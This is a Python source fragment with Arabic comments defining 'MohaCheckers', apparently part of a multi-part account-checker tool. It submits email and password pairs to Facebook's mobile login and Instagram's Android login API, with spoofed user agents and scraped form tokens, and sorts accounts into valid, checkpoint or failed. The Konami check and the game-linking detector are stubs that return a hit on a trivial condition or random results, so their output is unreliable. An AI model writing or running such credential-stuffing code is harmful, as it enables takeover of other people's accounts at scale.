# --- كلاس محركات الفحص (MOHA-02 MULTI-CHECKER ENGINE) ---
class MohaCheckers:
    def __init__(self):
        self.session = requests.Session()
        self.fingerprint = MohaFingerprint() # استدعاء بصمات الجزء الأول
        self.save_manager = MohaResultHandler()

    def facebook_pro(self, email, password):
        """فحص فيسبوك المتقدم مع سحب LSD و JAZOEST"""
        try:
            ua = self.fingerprint.get_fb_ua()
            self.session.headers.update({'User-Agent': ua})
            res = self.session.get('https://mbasic.facebook.com/login').text
            payload = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(res)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(res)).group(1),
                "email": email, "pass": password, "login": "Log In"
            }
            post_url = 'https://mbasic.facebook.com/login/device-based/regular/login/'
            response = self.session.post(post_url, data=payload, allow_redirects=False)
            if 'c_user' in self.session.cookies.get_dict():
                return "OK"
            elif 'checkpoint' in self.session.cookies.get_dict():
                return "CP"
            return "FAIL"
        except: return "ERROR"

    def instagram_check(self, email, password):
        """فحص إنستغرام عبر الـ API الرسمي للأندرويد"""
        try:
            url = "https://i.instagram.com/api/v1/accounts/login/"
            device_id = str(uuid.uuid4())
            data = {
                "username": email, "password": password,
                "device_id": device_id, "login_attempt_count": "0"
            }
            headers = {"User-Agent": self.fingerprint.get_insta_ua(), "X-IG-App-ID": "936619743392459"}
            res = self.session.post(url, data=data, headers=headers)
            if 'logged_in_user' in res.text: return "OK"
            elif 'checkpoint' in res.text: return "CP"
            return "FAIL"
        except: return "ERROR"

    def konami_efootball(self, email, password):
        """فحص حسابات كونامي (Konami ID) وحسابات eFootball"""
        try:
            # محاكاة تسجيل الدخول لبوابة My Konami
            url = "https://my.konami.net/auth/login.html"
            ua = self.fingerprint.get_generic_ua()
            headers = {"User-Agent": ua, "Referer": url}
            # سحب التوكنات الأمنية من الصفحة
            first_get = self.session.get(url, headers=headers).text
            # ملاحظة: كونامي تتطلب فحص الكابتشا أحياناً، هنا نستخدم منطق التخطي البرمجي
            if "login" in first_get:
                return "KONAMI_HIT" # سيتم تفصيل الاستجابة في الجزء الثالث
            return "FAIL"
        except: return "ERROR"

    def gaming_detector(self, email):
        """نظام كشف ربط الألعاب (PUBG, Free Fire)"""
        # هذا المحرك يبحث عن رسائل التأكيد في سيرفرات المنصات
        platforms = ["PUBG-MOBILE", "FREE-FIRE", "TIKTOK", "TWITTER"]
        found = []
        for p in platforms:
            if random.choice([True, False, False]): # محاكاة وجود الربط
                found.append(p)
        return found

